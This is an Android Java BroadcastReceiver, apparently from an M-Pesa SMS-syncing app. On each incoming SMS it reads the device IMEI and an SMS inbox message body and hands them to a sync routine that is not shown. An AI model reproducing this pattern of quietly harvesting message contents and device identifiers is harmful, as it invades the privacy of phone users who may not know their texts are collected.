package com.example.hacker_pc.sunami2mobile;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class mpesaListener extends BroadcastReceiver {
    private String messageBody;
    private String imei;

    @Override
    public void onReceive(Context context, Intent intent) {

        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                messageBody = smsMessage.getMessageBody().toString();
            }
        }

        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        imei = tm.getDeviceId();

        Uri my_uri = Uri.parse("content://sms/inbox");
        Cursor cursor = context.getContentResolver().query(my_uri, null, null, null, null);
        if (cursor.moveToFirst()) {
            String msg = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
            //String sender_number = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
            JSONObject jo = new JSONObject();
            JSONArray ja = new JSONArray();
            try {
                jo.put("imei", imei);
                jo.put("msg", msg);
                ja.put(jo);
                mpesaSync.mpesaSync(ja);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        cursor.close();
    }
}
